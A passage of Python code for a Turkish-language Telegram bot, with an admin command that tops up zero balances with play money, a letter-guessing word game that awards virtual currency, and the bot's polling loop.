    if user_id not in SUDO_USERS:
        return bot.reply_to(message, "Bu komutu kullanmaya yetkiniz yok.")
    
    try:
        with open('balances.json', "r") as file:
            balances = json.load(file)

        for key, value in balances.items():
            if value == 0:
                user_balances[key] = 25000

        save_balances()
        bot.reply_to(message, "Tüm uygun kullanıcılara 25000 bakiye gönderildi.")
        
    except json.JSONDecodeError:
        bot.reply_to(message, "Bakiye dosyası okunamadı. Lütfen dosya formatını kontrol edin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")
    
@bot.message_handler(commands=['kelime'])
def start_word_game(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if chat_id in word_game_sessions:
        bot.send_message(chat_id, 'Oyun zaten başlatıldı.')
        return

    target_word = random.choice(kelimeler)
    word_game_sessions[chat_id] = {'target_word': target_word.upper()}
    word_game_sessions[chat_id]['revealed_letters'] = ['_' if c.isalpha() else c for c in word_game_sessions[chat_id]['target_word']]
    bot.send_message(chat_id, 'Kelime Oyununa Hoş Geldiniz!\n\n' + ' '.join(word_game_sessions[chat_id]['revealed_letters']))

@bot.message_handler(func=lambda message: True)
def handle_word_guess(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id  

    if chat_id not in word_game_sessions:
        return

    if user_id not in user_balances:
        return

    target_word = word_game_sessions[chat_id]['target_word'].upper()
    revealed_letters = word_game_sessions[chat_id]['revealed_letters']

    guess = message.text.upper()

    if len(guess) != 1 and len(guess) != len(target_word):
        bot.reply_to(message, '')
    elif guess == target_word:
        user_balances[user_id] += 1500 
        user_name = message.from_user.first_name
        bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
        del word_game_sessions[chat_id]
    elif guess in target_word:
        for i, letter in enumerate(target_word):
            if letter == guess:
                revealed_letters[i] = guess
        if '_' not in revealed_letters:
            user_balances[user_id] += 1500
            user_name = message.from_user.first_name
            bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
            del word_game_sessions[chat_id]
        else:
            bot.reply_to(message, 'Doğru tahmin! Harf ekledim: ' + ' '.join(revealed_letters))
    else:
        bot.reply_to(message, 'Yanlış tahmin! 👎')  

bot.polling(none_stop=True)
